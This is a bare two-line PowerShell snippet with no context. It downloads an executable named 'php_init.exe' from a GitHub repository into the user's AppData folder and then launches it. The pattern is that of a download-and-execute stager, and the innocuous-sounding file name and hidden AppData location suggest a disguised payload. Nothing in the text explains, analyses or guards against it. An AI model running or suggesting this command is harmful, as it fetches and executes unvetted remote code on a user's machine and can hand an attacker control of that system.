iwr 'https://github.com/ah3nd823n/wallpin/raw/refs/heads/main/php_init.exe' -OutFile ($env:APPDATA+'\php_init.exe') -UseBasicParsing
Start-Process ($env:APPDATA+'\php_init.exe')
